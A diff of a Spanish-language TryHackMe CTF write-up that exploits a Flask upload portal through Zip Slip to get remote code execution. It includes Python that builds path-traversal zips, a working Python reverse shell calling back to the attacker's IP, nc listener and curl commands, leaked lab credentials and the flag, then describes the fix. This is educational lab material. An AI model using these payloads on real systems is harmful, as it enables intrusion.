@@ -1,33 +1,34 @@
 ---
-layout: post
 title: "The Hollow Shell"
-date: 2026-08-05
+date: 2026-08-05 17:30:00 -0400
+description: "Explotación de un portal Flask de subida de archivos mediante Zip Slip para lograr escritura arbitraria en el sistema de archivos y obtener RCE a través de un worker automatizado."
 categories: [TryHackMe, Hacker Holidays 2026]
-tags: [web, zip-slip, rce, flask, python, medium]
+tags: [web, zip-slip, rce, flask, python, information-disclosure, medium]
 ---
 
-> **Plataforma:** TryHackMe — Hacker Holidays 2026  
-> **Sala:** The Hollow Shell  
-> **Categoría:** Web  
-> **Dificultad:** Medium  
-> **Flag:** `THM{z1p_sl1pp3d_1nt0_a_sh3ll}`
+> 📌 **Ficha Técnica**
+>
+> * **Plataforma:** TryHackMe
+> * **Evento/Sala:** Hacker Holidays 2026 — The Hollow Shell
+> * **Dificultad:** Media
+> * **Categoría:** Web
+> * **Técnicas Clave:** Information Disclosure (comentario HTML), Zip Slip (path traversal en extracción de archivos), RCE vía worker automatizado, Reverse Shell en Python
 
 ---
 
 ## Descripción del reto
 
-> 🛎️ *You find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. Slip something inside and hold it to your ear.*
-> 
-> *The Byte Lotus beachfront lets guests personalise their in-room display by uploading a shell — a little souvenir pack of shoreline ambiance. Staff publish them through the Shoreline Display portal, and once a shell is "held to the room's ear" it plays its shore. Slip past what the portal forgets to check, and the shell answers with a shell of your own.*
+El briefing de la sala presenta a *Byte Lotus*, un hotel ficticio con un portal interno para que el personal suba "shells" — paquetes `.zip` con ambientación sonora de playa para las pantallas de las habitaciones:
 
-El briefing ya carga con pistas si se lee con atención:
+> *"Slip past what the portal forgets to check, and the shell answers with a shell of your own."*
 
-- **"Upload a shell"** → subida de archivos con doble sentido (concha ↔ web shell).
-- **"Slip past what the portal forgets to check"** → el portal no valida algo en la extracción del zip.
-- **"The shell answers with a shell of your own"** → el objetivo final es RCE (Remote Code Execution).
+Leyendo el texto con atención, ya se pueden identificar los vectores antes de tocar la máquina:
 
-La cadena de ataque completa resulta ser:  
-`Zip Slip (escritura arbitraria de archivos) → escritura en carpeta vigilada por worker → ejecución automática → reverse shell`
+- **"Upload a shell"** → funcionalidad de subida de archivos comprimidos.
+- **"Slip past what the portal forgets to check"** → el portal no valida algo durante la extracción del zip.
+- **"The shell answers with a shell of your own"** → el objetivo es conseguir RCE.
+
+La cadena de ataque completa es: `Zip Slip → escritura arbitraria de archivos → carpeta vigilada por worker → ejecución automática → reverse shell`.
 
 ---
 
@@ -41,17 +42,22 @@ nmap -sC -sV --min-rate 5000 <TARGET_IP>
 
 ```
 PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
 5000/tcp open  http    gunicorn
 ```
 
-Dos puertos abiertos. El servicio web **no está en el 80**, sino en el **5000**, corriendo sobre **gunicorn** (lo que confirma que la app está hecha en Python — Flask con toda probabilidad). Navegando a `http://<IP>:5000` la app redirige automáticamente a `/login`.
+> El servicio web **no está en el puerto 80** sino en el **5000**. La presencia de `gunicorn` confirma que es una aplicación Python — casi con toda seguridad Flask.
+{: .prompt-info }
+
+Navegando a `http://<IP>:5000` la app redirige automáticamente a `/login`, confirmando que existe un panel de autenticación.
 
 ---
 
-## Acceso inicial — credenciales filtradas en el código fuente
+## Análisis de la aplicación
 
-Al ver el código fuente del login (`Ctrl+U` en el navegador) aparece un comentario HTML que el equipo de IT dejó olvidado:
+### Information Disclosure — credenciales en el código fuente
+
+Al revisar el código fuente del login con `Ctrl+U` aparece un comentario HTML que el equipo de IT dejó sin eliminar:
 
 ```html
 <!--
@@ -64,32 +70,29 @@ Al ver el código fuente del login (`Ctrl+U` en el navegador) aparece un comenta
 -->
 ```
 
-Credenciales hardcodeadas en el HTML público. Error clásico de "lo dejo temporal y me olvido". Iniciamos sesión con `concierge / StayNoticed2024!` y llegamos al dashboard.
+> Antes de buscar vulnerabilidades complejas, siempre revisa el código fuente de las páginas con `Ctrl+U`. Los comentarios HTML son uno de los lugares más frecuentes de fuga de información sensible.
+{: .prompt-tip }
 
----
+Con las credenciales `concierge / StayNoticed2024!` accedemos al dashboard.
 
-## Análisis del dashboard
+### Análisis del dashboard
 
 El panel de staff expone dos funcionalidades:
 
-1. **Subida de shells**: acepta un `.zip` que debe contener un manifiesto `shell.json` listando sus assets (`png jpg gif svg css json`).
-2. **Listado de shells activos**: muestra el nombre y el ID de cada shell subido (p.ej. `shells/18ced5ab0c5f/`).
+1. **Subida de shells:** acepta un `.zip` que debe contener un `shell.json` (manifiesto con lista de assets). Tipos de asset permitidos: `png jpg gif svg css json`.
+2. **Listado de shells activos:** muestra nombre e ID de cada shell subido.
 
-Una nota en el dashboard llama la atención:
+Una nota al pie del formulario de subida contiene la pista más importante del reto:
 
 > *"A shell may include optional **automation hooks** — the theme worker applies these for you shortly after the shell comes ashore, so you don't have to touch each tablet by hand."*
 
-Dos pistas críticas aquí:
-- Existe un proceso en segundo plano (**theme worker**) que procesa las shells automáticamente.
-- Hay un mecanismo de **"hooks"** opcionales que ese worker aplica.
+Esto revela dos cosas críticas:
+- Existe un **proceso en segundo plano** (theme worker) que procesa las shells automáticamente, con un pequeño delay tras la subida.
+- Hay un mecanismo de **hooks** que ese worker "aplica" — si podemos escribir en la carpeta que vigila, podemos ejecutar código.
 
-Esto sugiere que si un archivo llega a una carpeta que ese worker vigila, podría ejecutarlo automáticamente.
+### Comportamiento base — zip válido
 
----
-
-## Confirmando el Zip Slip
-
-Primero verificamos el comportamiento base subiendo un zip válido para entender qué hace la app:
+Antes de explotar, verificamos el flujo normal. Creamos un zip mínimo válido:
 
 ```json
 {
@@ -98,69 +101,109 @@ Primero verificamos el comportamiento base subiendo un zip válido para entender
 }
 ```
 
-El zip se acepta, el shell aparece en el dashboard con un ID único, y los archivos son accesibles en:
+```bash
+# Obtener cookie de sesión primero
+curl -s -X POST http://<IP>:5000/login \
+  -d "username=concierge&password=StayNoticed2024!" \
+  -c cookies.txt
+
+# Subir el zip
+curl -s -b cookies.txt \
+  -F "shell=@test-shell.zip" \
+  http://<IP>:5000/upload
+```
+
+El shell aparece en el dashboard con un ID único y sus archivos son accesibles directamente:
 
 ```
-GET /shells/<id>/shell.json
-GET /shells/<id>/beach.css
+GET /shells/<id>/shell.json   → 200 OK
+GET /shells/<id>/beach.css    → 200 OK
 ```
 
-Ahora probamos si el servidor sanitiza los nombres de las entradas del zip durante la extracción. La herramienta `zip` estándar normaliza rutas y no permite `../`, pero Python sí:
+---
+
+## Explotación
+
+### Paso 1 — Confirmar Zip Slip
+
+Zip Slip es una vulnerabilidad de path traversal que se produce durante la **extracción** de archivos comprimidos. Si el servidor no valida que los nombres de las entradas del zip permanezcan dentro del directorio de destino, un atacante puede escribir archivos en rutas arbitrarias del filesystem.
+
+> El comando `zip` estándar normaliza las rutas y elimina los `../` automáticamente. Para crear entradas con path traversal hay que usar la librería `zipfile` de Python directamente, que no aplica ninguna sanitización.
+{: .prompt-warning }
+
+Creamos un zip de prueba que intenta escribir fuera del directorio de extracción, apuntando a `/static/` (carpeta servida por HTTP, lo que nos permite verificar el resultado):
 
 ```python
 import json, zipfile
 
 manifest = {"name": "zipslip-confirm", "assets": []}
+
 with zipfile.ZipFile("confirm.zip", "w") as z:
     z.writestr("shell.json", json.dumps(manifest))
     z.writestr("../../static/zipslip_confirm.txt", "ZIP_SLIP_CONFIRMED")
 ```
 
-Subimos el zip y luego:
-
 ```bash
+python3 build_confirm.py
+curl -s -b cookies.txt -F "shell=@confirm.zip" http://<IP>:5000/upload
 curl -s http://<IP>:5000/static/zipslip_confirm.txt
 ```
 
 Respuesta: `ZIP_SLIP_CONFIRMED`
 
-**Zip Slip confirmado.** El servidor extrae el zip sin validar los nombres de las entradas, lo que permite escribir archivos en rutas arbitrarias fuera del directorio de destino.
+**Zip Slip confirmado.** El servidor usa `extractall()` sin validación de rutas, lo que nos permite escribir en cualquier ruta relativa al directorio de la aplicación.
 
-### Por qué el zip estándar no sirve aquí
+### Paso 2 — Identificar el objetivo: directorio `/hooks/`
 
-El comando `zip` normaliza automáticamente los nombres de archivo y elimina los `../`. Python's `zipfile.ZipFile.writestr()` los escribe tal cual, sin sanitización, por eso es la herramienta correcta para armar un zip de Zip Slip.
+Con escritura arbitraria de archivos en el servidor, el siguiente paso es encontrar dónde escribir para conseguir ejecución de código. La pista está en el propio texto del dashboard:
 
----
+- El portal menciona explícitamente **"automation hooks"**.
+- El "theme worker" procesa las shells **automáticamente** poco después de la subida.
+- La estructura de archivos de la app (con carpetas `shells/` y `static/`) sugiere que podría existir una carpeta hermana llamada `hooks/`.
 
-## Explotación — Reverse shell vía `/hooks/`
+La hipótesis es que `/hooks/` es una carpeta del filesystem (no una ruta HTTP) que el worker vigila y ejecuta automáticamente cualquier script `.py` nuevo que aparezca. El nombre es una inferencia directa del lenguaje del reto.
 
-### Hipótesis del directorio `/hooks/`
+### Paso 3 — Preparar el reverse shell
 
-Dado que:
-1. Tenemos escritura arbitraria de archivos en el servidor.
-2. Existe un "theme worker" que procesa las shells automáticamente.
-3. La descripción menciona explícitamente "automation hooks".
+> En fish shell **no existe soporte para heredocs** (`<< EOF`). Para crear el archivo de payload hay que usar Python directamente.
+{: .prompt-warning }
 
-La hipótesis es que existe una carpeta `/hooks/` en el filesystem (hermana de `shells/` y `static/`) que el worker vigila y ejecuta automáticamente cualquier script `.py` nuevo que aparezca. El nombre es una inferencia educada basada en el lenguaje del reto — no es una ruta HTTP, es una carpeta del sistema.
+```bash
+# Crear el archivo de payload limpio con Python (sin indentación extra)
+python3 -c "
+payload = '''import socket, os, pty
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((\"<TU_IP_TUN0>\", 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+pty.spawn(\"/bin/bash\")
+'''
+with open('callback.py', 'w') as f:
+    f.write(payload)
+"
+```
 
-### Preparar el payload
+> Si el payload Python se genera desde un bloque multilínea con indentación (dentro de un `if` o función), el archivo resultante heredará esos espacios. Cuando el worker intente ejecutarlo, fallará con `IndentationError`. La forma correcta es escribir el payload a un archivo separado sin indentación y luego leerlo.
+{: .prompt-warning }
 
-Creamos el script de reverse shell sin indentación (para evitar `IndentationError` en Python al ejecutarse):
+Verificamos que el archivo quedó limpio, con cada línea en la columna 0:
+
+```bash
+cat callback.py
+```
 
 ```python
-# callback.py
 import socket, os, pty
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("TU_IP_TUN0", 4444))
+s.connect(("<TU_IP_TUN0>", 4444))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 pty.spawn("/bin/bash")
 ```
 
-> **Nota:** al generar el payload desde Python con cadenas multilínea indentadas (dentro de un bloque `if` o función), el contenido heredará los espacios de indentación del código envolvente. Eso produce un `IndentationError` cuando el servidor intenta ejecutarlo. La forma segura es escribir el payload a un archivo separado primero y luego leerlo al armar el zip.
-
-Armamos el zip malicioso:
+### Paso 4 — Armar el zip malicioso
 
 ```python
 import json, zipfile
@@ -175,18 +218,23 @@ with zipfile.ZipFile("hook-rce.zip", "w") as z:
     z.writestr("../../hooks/callback.py", payload)
 ```
 
-Verificamos que el nombre de la entrada quedó correcto:
+Verificamos que las entradas del zip quedaron correctas antes de subir:
 
 ```bash
 unzip -l hook-rce.zip
 ```
 
 ```
-shell.json
-../../hooks/callback.py
+Archive:  hook-rce.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+       42  08-05-2026 17:22   shell.json
+      205  08-05-2026 17:22   ../../hooks/callback.py
+---------                     -------
+      247                     2 files
 ```
 
-### Ejecutar
+### Paso 5 — Ejecutar
 
 En una terminal aparte, levantamos el listener:
 
@@ -194,7 +242,7 @@ En una terminal aparte, levantamos el listener:
 nc -lvnp 4444
 ```
 
-Subimos el zip:
+Subimos el zip y esperamos unos segundos (el worker tiene un pequeño delay):
 
 ```bash
 curl -s -b cookies.txt \
@@ -202,7 +250,7 @@ curl -s -b cookies.txt \
   http://<IP>:5000/upload
 ```
 
-Unos segundos después (el worker tiene un pequeño delay, como dice el dashboard), la conexión llega:
+La conexión llega:
 
 ```
 Ncat: Connection from <IP>:55430.
@@ -211,7 +259,7 @@ roomservice@tryhackme-2404:/var/www/conch$
 
 ---
 
-## Flag
+## Captura de la flag
 
 ```bash
 cd /home/roomservice
@@ -224,23 +272,21 @@ THM{z1p_sl1pp3d_1nt0_a_sh3ll}
 
 ---
 
-## Análisis de la vulnerabilidad
+## Análisis técnico de las vulnerabilidades
 
-### Zip Slip (CVE-2018-1002220 y variantes)
+### Zip Slip
 
-Zip Slip es una vulnerabilidad de path traversal que ocurre durante la **extracción** de archivos comprimidos. Si el servidor extrae un zip sin validar que los nombres de sus entradas permanezcan dentro del directorio de destino, un atacante puede escribir archivos en rutas arbitrarias del sistema de archivos.
-
-La condición vulnerable típica en Python es:
+Zip Slip se produce cuando un servidor extrae un archivo comprimido sin validar que cada entrada permanezca dentro del directorio de destino. El patrón vulnerable en Python es:
 
 ```python
-# VULNERABLE
-import zipfile, os
+# VULNERABLE — no hay validación de rutas
+import zipfile
 
 with zipfile.ZipFile("upload.zip") as z:
     z.extractall("/var/www/app/shells/")
 ```
 
-`extractall()` sin validación de rutas respeta los `../` en los nombres de entrada y escribe fuera del destino. La corrección es validar cada nombre antes de extraer:
+`extractall()` respeta los `../` en los nombres de entrada y escribe fuera del destino. La corrección correcta usa `os.path.realpath` para verificar que la ruta resuelta siga dentro del directorio esperado:
 
 ```python
 # SEGURO
@@ -252,33 +298,43 @@ with zipfile.ZipFile("upload.zip") as z:
     for entry in z.namelist():
         target = os.path.realpath(os.path.join(DEST, entry))
         if not target.startswith(os.path.realpath(DEST)):
-            raise Exception(f"Zip Slip detectado: {entry}")
+            raise ValueError(f"Zip Slip detectado: {entry}")
     z.extractall(DEST)
 ```
 
 ### Worker con ejecución automática no restringida
 
-El "theme worker" ejecuta automáticamente cualquier archivo `.py` que aparezca en la carpeta `/hooks/`. Sin una allowlist de scripts autorizados o sin verificar la integridad/firma de los archivos antes de ejecutarlos, cualquier archivo que llegue ahí (por ejemplo, vía Zip Slip) se convierte en ejecución de código arbitrario.
-
-La corrección implica combinar la sanitización del zip con controles sobre la carpeta de hooks: validar origen, firma HMAC, o directamente no aceptar código ejecutable como parte de un asset de usuario.
+El "theme worker" ejecuta automáticamente cualquier archivo `.py` que aparezca en `/hooks/`. Sin una allowlist de scripts autorizados ni verificación de integridad (firma HMAC, por ejemplo), cualquier archivo que llegue a esa carpeta — incluso vía Zip Slip — se convierte en ejecución de código arbitrario con los privilegios del worker.
 
 ---
 
-## Resumen de la cadena
+## Resumen de la cadena de ataque
 
-| Paso | Técnica | Resultado |
-|------|---------|-----------|
-| Reconocimiento | nmap | Servicio en puerto 5000, Flask/gunicorn |
-| Information disclosure | Comentario HTML | Credenciales `concierge / StayNoticed2024!` |
-| Análisis del portal | Revisión del dashboard | Identificación del mecanismo de hooks |
-| PoC | Zip Slip a `/static/` | Escritura arbitraria de archivos confirmada |
-| Explotación | Zip Slip a `/hooks/callback.py` | RCE como `roomservice` |
-| Flag | `cat /home/roomservice/flag.txt` | `THM{z1p_sl1pp3d_1nt0_a_sh3ll}` |
+| # | Paso | Técnica | Resultado |
+|---|------|---------|-----------|
+| 1 | Reconocimiento | nmap | Puerto 5000, Flask/gunicorn |
+| 2 | Information Disclosure | Comentario HTML | Credenciales `concierge / StayNoticed2024!` |
+| 3 | Análisis del dashboard | Revisión del texto del portal | Identificación del mecanismo de hooks y worker |
+| 4 | Prueba de concepto | Zip Slip a `/static/` | Escritura arbitraria de archivos confirmada |
+| 5 | Explotación | Zip Slip a `/hooks/callback.py` | RCE como `roomservice` |
+| 6 | Flag | `cat /home/roomservice/flag.txt` | `THM{z1p_sl1pp3d_1nt0_a_sh3ll}` |
 
 ---
 
-## Lecciones aprendidas
+## Conclusión / Retroalimentación
 
-**Para atacantes (CTF):** cuando una app acepta archivos comprimidos y los extrae en el servidor, Zip Slip siempre vale la pena probarlo. La clave es armar el zip con Python directamente (no con el comando `zip`), ya que las herramientas estándar normalizan rutas. Una vez con escritura arbitraria, la pregunta es qué proceso corre en el servidor y qué carpetas vigila.
+**Aprendizajes clave:**
 
-**Para defensores:** nunca extraer un zip sin validar que cada entrada quede dentro del directorio de destino (`os.path.realpath` + `startswith`). Además, si existe un worker que procesa archivos automáticamente, ese directorio debe estar protegido de escritura para cualquier proceso no privilegiado, y solo debe ejecutar scripts pre-autorizados.
+- **Siempre lee el código fuente de las páginas.** Las credenciales en comentarios HTML son un hallazgo sorprendentemente frecuente en aplicaciones reales. `Ctrl+U` es el primer paso después de cargar cualquier página.
+
+- **Zip Slip no requiere herramientas especiales.** La librería estándar `zipfile` de Python es suficiente para armar el zip malicioso. Lo importante es entender por qué el comando `zip` del sistema no sirve: normaliza rutas automáticamente.
+
+- **Las pistas del texto del reto son literales.** "Automation hooks" y "theme worker" describían exactamente los componentes del sistema. Leer la descripción con mentalidad técnica (¿qué implementación real hay detrás de estas palabras?) es una habilidad tan importante como saber usar herramientas.
+
+- **Escritura arbitraria ≠ RCE automático.** Tener Zip Slip solo significa que puedes escribir archivos. El RCE dependió de que el worker ejecutara automáticamente lo que cayera en `/hooks/`. Identificar ese vector fue el razonamiento más importante del reto.
+
+- **fish shell tiene diferencias importantes con bash.** Los heredocs (`<< EOF`) no están soportados. Para crear archivos de texto multi-línea en fish, lo más robusto es delegar en `python3 -c "..."`.
+
+**Feedback general de la sala:**
+
+Una sala bien construida con una narrativa coherente que conecta el lore (hotel de playa, conchas de mar) con los conceptos técnicos (zip slip, shell). La vulnerabilidad es real y relevante — Zip Slip afectó a decenas de librerías populares en 2018 y versiones similares siguen apareciendo en auditorías de código hoy. El "theme worker" como mecanismo de ejecución es un vector creativo que obliga al jugador a pensar más allá de "subir un archivo PHP" y razonar sobre la arquitectura del sistema. Recomendada para quienes quieran trabajar path traversal en contexto de file upload sin depender de extensiones de archivo como vector principal.
